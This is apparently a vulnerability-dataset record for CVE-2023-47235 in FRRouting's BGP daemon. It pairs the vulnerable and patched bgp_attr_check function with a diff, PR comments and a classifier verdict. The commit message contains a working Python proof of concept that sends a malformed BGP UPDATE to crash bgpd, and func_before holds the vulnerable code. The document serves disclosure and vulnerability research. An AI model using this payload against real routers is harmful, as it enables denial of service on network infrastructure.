{
  "cve_id": "CVE-2023-47235",
  "cwe_ids": [
    "CWE-Other"
  ],
  "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
  "cvss_is_v3": true,
  "repo_name": "FRRouting/frr",
  "commit_msg": "bgpd: Treat EOR as withdrawn to avoid unwanted handling of malformed attrs\n\nTreat-as-withdraw, otherwise if we just ignore it, we will pass it to be\nprocessed as a normal UPDATE without mandatory attributes, that could lead\nto harmful behavior. In this case, a crash for route-maps with the configuration\nsuch as:\n\n```\nrouter bgp 65001\n no bgp ebgp-requires-policy\n neighbor 127.0.0.1 remote-as external\n neighbor 127.0.0.1 passive\n neighbor 127.0.0.1 ebgp-multihop\n neighbor 127.0.0.1 disable-connected-check\n neighbor 127.0.0.1 update-source 127.0.0.2\n neighbor 127.0.0.1 timers 3 90\n neighbor 127.0.0.1 timers connect 1\n !\n address-family ipv4 unicast\n  neighbor 127.0.0.1 addpath-tx-all-paths\n  neighbor 127.0.0.1 default-originate\n  neighbor 127.0.0.1 route-map RM_IN in\n exit-address-family\nexit\n!\nroute-map RM_IN permit 10\n set as-path prepend 200\nexit\n```\n\nSend a malformed optional transitive attribute:\n\n```\nimport socket\nimport time\n\nOPEN = (b\"\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\"\nb\"\\xff\\xff\\x00\\x62\\x01\\x04\\xfd\\xea\\x00\\x5a\\x0a\\x00\\x00\\x01\\x45\\x02\"\nb\"\\x06\\x01\\x04\\x00\\x01\\x00\\x01\\x02\\x02\\x02\\x00\\x02\\x02\\x46\\x00\\x02\"\nb\"\\x06\\x41\\x04\\x00\\x00\\xfd\\xea\\x02\\x02\\x06\\x00\\x02\\x06\\x45\\x04\\x00\"\nb\"\\x01\\x01\\x03\\x02\\x0e\\x49\\x0c\\x0a\\x64\\x6f\\x6e\\x61\\x74\\x61\\x73\\x2d\"\nb\"\\x70\\x63\\x00\\x02\\x04\\x40\\x02\\x00\\x78\\x02\\x09\\x47\\x07\\x00\\x01\\x01\"\nb\"\\x80\\x00\\x00\\x00\")\n\nKEEPALIVE = (b\"\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\"\nb\"\\xff\\xff\\xff\\xff\\xff\\xff\\x00\\x13\\x04\")\n\nUPDATE = bytearray.fromhex(\"ffffffffffffffffffffffffffffffff002b0200000003c0ff00010100eb00ac100b0b001ad908ac100b0b\")\n\ns = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\ns.connect(('127.0.0.2', 179))\ns.send(OPEN)\ndata = s.recv(1024)\ns.send(KEEPALIVE)\ndata = s.recv(1024)\ns.send(UPDATE)\ndata = s.recv(1024)\ntime.sleep(100)\ns.close()\n```\n\nReported-by: Iggy Frankovic <iggyfran@amazon.com>\nSigned-off-by: Donatas Abraitis <donatas@opensourcerouting.org>",
  "commit_hash": "6814f2e0138a6ea5e1f83bdd9085d9a77999900b",
  "git_url": "https://github.com/FRRouting/frr/commit/6814f2e0138a6ea5e1f83bdd9085d9a77999900b",
  "file_path": "bgpd/bgp_attr.c",
  "func_name": "bgp_attr_check",
  "func_before": "static int bgp_attr_check(struct peer *peer, struct attr *attr,\n\t\t\t  bgp_size_t length)\n{\n\tuint8_t type = 0;\n\n\t/* BGP Graceful-Restart End-of-RIB for IPv4 unicast is signaled as an\n\t * empty UPDATE.  */\n\tif (CHECK_FLAG(peer->cap, PEER_CAP_RESTART_RCV) && !attr->flag &&\n\t    !length)\n\t\treturn BGP_ATTR_PARSE_PROCEED;\n\n\t/* \"An UPDATE message that contains the MP_UNREACH_NLRI is not required\n\t   to carry any other path attributes.\", though if MP_REACH_NLRI or NLRI\n\t   are present, it should.  Check for any other attribute being present\n\t   instead.\n\t */\n\tif ((!CHECK_FLAG(attr->flag, ATTR_FLAG_BIT(BGP_ATTR_MP_REACH_NLRI)) &&\n\t     CHECK_FLAG(attr->flag, ATTR_FLAG_BIT(BGP_ATTR_MP_UNREACH_NLRI))))\n\t\treturn BGP_ATTR_PARSE_PROCEED;\n\n\tif (!CHECK_FLAG(attr->flag, ATTR_FLAG_BIT(BGP_ATTR_ORIGIN)))\n\t\ttype = BGP_ATTR_ORIGIN;\n\n\tif (!CHECK_FLAG(attr->flag, ATTR_FLAG_BIT(BGP_ATTR_AS_PATH)))\n\t\ttype = BGP_ATTR_AS_PATH;\n\n\t/* RFC 2858 makes Next-Hop optional/ignored, if MP_REACH_NLRI is present\n\t * and\n\t * NLRI is empty. We can't easily check NLRI empty here though.\n\t */\n\tif (!CHECK_FLAG(attr->flag, ATTR_FLAG_BIT(BGP_ATTR_NEXT_HOP))\n\t    && !CHECK_FLAG(attr->flag, ATTR_FLAG_BIT(BGP_ATTR_MP_REACH_NLRI)))\n\t\ttype = BGP_ATTR_NEXT_HOP;\n\n\tif (peer->sort == BGP_PEER_IBGP\n\t    && !CHECK_FLAG(attr->flag, ATTR_FLAG_BIT(BGP_ATTR_LOCAL_PREF)))\n\t\ttype = BGP_ATTR_LOCAL_PREF;\n\n\t/* If any of the well-known mandatory attributes are not present\n\t * in an UPDATE message, then \"treat-as-withdraw\" MUST be used.\n\t */\n\tif (type) {\n\t\tflog_warn(EC_BGP_MISSING_ATTRIBUTE,\n\t\t\t  \"%s Missing well-known attribute %s.\", peer->host,\n\t\t\t  lookup_msg(attr_str, type, NULL));\n\t\treturn BGP_ATTR_PARSE_WITHDRAW;\n\t}\n\treturn BGP_ATTR_PARSE_PROCEED;\n}",
  "abstract_func_before": "static int bgp_attr_check(struct peer *peer, struct attr *attr,\n\t\t\t  bgp_size_t VAR_0)\n{\n\tuint8_t VAR_1 = 0;\n\n\t/* COMMENT_0 */\n                     \n\tif (CHECK_FLAG(peer->cap, VAR_2) && !attr->flag &&\n\t    !VAR_0)\n\t\treturn VAR_3;\n\n\t/* COMMENT_2 */\n                                                                         \n                                                                        \n            \n    \n\tif ((!CHECK_FLAG(attr->flag, ATTR_FLAG_BIT(VAR_4)) &&\n\t     CHECK_FLAG(attr->flag, ATTR_FLAG_BIT(VAR_5))))\n\t\treturn VAR_3;\n\n\tif (!CHECK_FLAG(attr->flag, ATTR_FLAG_BIT(VAR_6)))\n\t\tVAR_1 = VAR_6;\n\n\tif (!CHECK_FLAG(attr->flag, ATTR_FLAG_BIT(VAR_7)))\n\t\tVAR_1 = VAR_7;\n\n\t/* COMMENT_7 */\n       \n                                                                \n    \n\tif (!CHECK_FLAG(attr->flag, ATTR_FLAG_BIT(VAR_8))\n\t    && !CHECK_FLAG(attr->flag, ATTR_FLAG_BIT(VAR_4)))\n\t\tVAR_1 = VAR_8;\n\n\tif (peer->sort == VAR_9\n\t    && !CHECK_FLAG(attr->flag, ATTR_FLAG_BIT(VAR_10)))\n\t\tVAR_1 = VAR_10;\n\n\t/* COMMENT_11 */\n                                                                \n    \n\tif (VAR_1) {\n\t\tflog_warn(VAR_11,\n\t\t\t  \"%s Missing well-known attribute %s.\", peer->host,\n\t\t\t  lookup_msg(VAR_12, VAR_1, NULL));\n\t\treturn VAR_13;\n\t}\n\treturn VAR_3;\n}",
  "func_graph_path_before": "FRRouting/frr/6814f2e0138a6ea5e1f83bdd9085d9a77999900b/bgp_attr.c/vul/before/1.json",
  "func": "static int bgp_attr_check(struct peer *peer, struct attr *attr,\n\t\t\t  bgp_size_t length)\n{\n\tuint8_t type = 0;\n\n\t/* BGP Graceful-Restart End-of-RIB for IPv4 unicast is signaled as an\n\t * empty UPDATE. Treat-as-withdraw, otherwise if we just ignore it,\n\t * we will pass it to be processed as a normal UPDATE without mandatory\n\t * attributes, that could lead to harmful behavior.\n\t */\n\tif (CHECK_FLAG(peer->cap, PEER_CAP_RESTART_RCV) && !attr->flag &&\n\t    !length)\n\t\treturn BGP_ATTR_PARSE_WITHDRAW;\n\n\t/* \"An UPDATE message that contains the MP_UNREACH_NLRI is not required\n\t   to carry any other path attributes.\", though if MP_REACH_NLRI or NLRI\n\t   are present, it should.  Check for any other attribute being present\n\t   instead.\n\t */\n\tif ((!CHECK_FLAG(attr->flag, ATTR_FLAG_BIT(BGP_ATTR_MP_REACH_NLRI)) &&\n\t     CHECK_FLAG(attr->flag, ATTR_FLAG_BIT(BGP_ATTR_MP_UNREACH_NLRI))))\n\t\treturn BGP_ATTR_PARSE_PROCEED;\n\n\tif (!CHECK_FLAG(attr->flag, ATTR_FLAG_BIT(BGP_ATTR_ORIGIN)))\n\t\ttype = BGP_ATTR_ORIGIN;\n\n\tif (!CHECK_FLAG(attr->flag, ATTR_FLAG_BIT(BGP_ATTR_AS_PATH)))\n\t\ttype = BGP_ATTR_AS_PATH;\n\n\t/* RFC 2858 makes Next-Hop optional/ignored, if MP_REACH_NLRI is present\n\t * and\n\t * NLRI is empty. We can't easily check NLRI empty here though.\n\t */\n\tif (!CHECK_FLAG(attr->flag, ATTR_FLAG_BIT(BGP_ATTR_NEXT_HOP))\n\t    && !CHECK_FLAG(attr->flag, ATTR_FLAG_BIT(BGP_ATTR_MP_REACH_NLRI)))\n\t\ttype = BGP_ATTR_NEXT_HOP;\n\n\tif (peer->sort == BGP_PEER_IBGP\n\t    && !CHECK_FLAG(attr->flag, ATTR_FLAG_BIT(BGP_ATTR_LOCAL_PREF)))\n\t\ttype = BGP_ATTR_LOCAL_PREF;\n\n\t/* If any of the well-known mandatory attributes are not present\n\t * in an UPDATE message, then \"treat-as-withdraw\" MUST be used.\n\t */\n\tif (type) {\n\t\tflog_warn(EC_BGP_MISSING_ATTRIBUTE,\n\t\t\t  \"%s Missing well-known attribute %s.\", peer->host,\n\t\t\t  lookup_msg(attr_str, type, NULL));\n\t\treturn BGP_ATTR_PARSE_WITHDRAW;\n\t}\n\treturn BGP_ATTR_PARSE_PROCEED;\n}",
  "abstract_func": "static int bgp_attr_check(struct peer *peer, struct attr *attr,\n\t\t\t  bgp_size_t VAR_0)\n{\n\tuint8_t VAR_1 = 0;\n\n\t/* COMMENT_0 */\n                                                                    \n                                                                        \n                                                    \n    \n\tif (CHECK_FLAG(peer->cap, VAR_2) && !attr->flag &&\n\t    !VAR_0)\n\t\treturn VAR_3;\n\n\t/* COMMENT_5 */\n                                                                         \n                                                                        \n            \n    \n\tif ((!CHECK_FLAG(attr->flag, ATTR_FLAG_BIT(VAR_4)) &&\n\t     CHECK_FLAG(attr->flag, ATTR_FLAG_BIT(VAR_5))))\n\t\treturn VAR_6;\n\n\tif (!CHECK_FLAG(attr->flag, ATTR_FLAG_BIT(VAR_7)))\n\t\tVAR_1 = VAR_7;\n\n\tif (!CHECK_FLAG(attr->flag, ATTR_FLAG_BIT(VAR_8)))\n\t\tVAR_1 = VAR_8;\n\n\t/* COMMENT_10 */\n       \n                                                                \n    \n\tif (!CHECK_FLAG(attr->flag, ATTR_FLAG_BIT(VAR_9))\n\t    && !CHECK_FLAG(attr->flag, ATTR_FLAG_BIT(VAR_4)))\n\t\tVAR_1 = VAR_9;\n\n\tif (peer->sort == VAR_10\n\t    && !CHECK_FLAG(attr->flag, ATTR_FLAG_BIT(VAR_11)))\n\t\tVAR_1 = VAR_11;\n\n\t/* COMMENT_14 */\n                                                                \n    \n\tif (VAR_1) {\n\t\tflog_warn(VAR_12,\n\t\t\t  \"%s Missing well-known attribute %s.\", peer->host,\n\t\t\t  lookup_msg(VAR_13, VAR_1, NULL));\n\t\treturn VAR_3;\n\t}\n\treturn VAR_6;\n}",
  "func_graph_path": "FRRouting/frr/6814f2e0138a6ea5e1f83bdd9085d9a77999900b/bgp_attr.c/vul/after/1.json",
  "diff_func": "--- func_before\n+++ func_after\n@@ -4,10 +4,13 @@\n \tuint8_t type = 0;\n \n \t/* BGP Graceful-Restart End-of-RIB for IPv4 unicast is signaled as an\n-\t * empty UPDATE.  */\n+\t * empty UPDATE. Treat-as-withdraw, otherwise if we just ignore it,\n+\t * we will pass it to be processed as a normal UPDATE without mandatory\n+\t * attributes, that could lead to harmful behavior.\n+\t */\n \tif (CHECK_FLAG(peer->cap, PEER_CAP_RESTART_RCV) && !attr->flag &&\n \t    !length)\n-\t\treturn BGP_ATTR_PARSE_PROCEED;\n+\t\treturn BGP_ATTR_PARSE_WITHDRAW;\n \n \t/* \"An UPDATE message that contains the MP_UNREACH_NLRI is not required\n \t   to carry any other path attributes.\", though if MP_REACH_NLRI or NLRI",
  "diff_line_info": {
    "deleted_lines": [
      "\t * empty UPDATE.  */",
      "\t\treturn BGP_ATTR_PARSE_PROCEED;"
    ],
    "added_lines": [
      "\t * empty UPDATE. Treat-as-withdraw, otherwise if we just ignore it,",
      "\t * we will pass it to be processed as a normal UPDATE without mandatory",
      "\t * attributes, that could lead to harmful behavior.",
      "\t */",
      "\t\treturn BGP_ATTR_PARSE_WITHDRAW;"
    ]
  },
  "is_vul": true,
  "pr_url": "https://github.com/FRRouting/frr/pull/14716",
  "description": {
    "pr_info": {
      "title": "bgpd: A couple more bgpd crash fixes for malformed packets ",
      "number": 14716
    },
    "comment": [
      "Found when fuzzing, in the normal case, such packets can't exist at all.",
      "@Mergifyio backport dev/9.1",
      "> backport dev/9.1\n\n#### ✅ Backports have been created\n\n<details>\n\n* [#14735 bgpd: A couple more bgpd crash fixes for malformed packets  (backport #14716)](https://github.com/FRRouting/frr/pull/14735) has been created for branch `dev/9.1`\n\n</details>\n\n\n<!---\nDO NOT EDIT\n-*- Mergify Payload -*-\n{\"command\": \"backport dev/9.1\", \"conclusion\": \"success\", \"action_is_running\": true}\n-*- Mergify Payload End -*-\n-->",
      "Is there a plan for a stable/9.0 backport, too?",
      "@Mergifyio backport stable/9.0",
      "> backport stable/9.0\n\n#### ✅ Backports have been created\n\n<details>\n\n* [#14861 bgpd: A couple more bgpd crash fixes for malformed packets  (backport #14716)](https://github.com/FRRouting/frr/pull/14861) has been created for branch `stable/9.0`\n\n</details>\n\n\n<!---\nDO NOT EDIT\n-*- Mergify Payload -*-\n{\"command\": \"backport stable/9.0\", \"conclusion\": \"success\", \"action_is_running\": true}\n-*- Mergify Payload End -*-\n-->",
      "@Mergifyio backport stable/8.4",
      "> backport stable/8.4\n\n#### ✅ Backports have been created\n\n<details>\n\n* [#15930 bgpd: A couple more bgpd crash fixes for malformed packets  (backport #14716)](https://github.com/FRRouting/frr/pull/15930) has been created for branch `stable/8.4` but encountered conflicts\n\n</details>\n\n\n<!---\nDO NOT EDIT\n-*- Mergify Payload -*-\n{\"command\": \"backport stable/8.4\", \"conclusion\": \"success\", \"action_is_running\": true}\n-*- Mergify Payload End -*-\n-->"
    ]
  },
  "Bug Filter": "Security Vulnerability Fix\nConfidence Score: 0.95",
  "Bug Filter Confidence": 0.95,
  "Bug Filter Response": "\n\nThe patch addresses a scenario where malformed BGP attributes could cause a crash, which is a security issue impacting availability. The code change modifies how EOR messages are handled to prevent such crashes.\n\n**Final Output:**\nAnalysis: The patch modifies the handling of EOR messages to treat them as withdrawals, preventing the processing of malformed attributes that could cause a crash. This addresses a security vulnerability that could lead to a denial of service.\nFinal Classification: Security Vulnerability Fix\nConfidence Score: 0.95"
}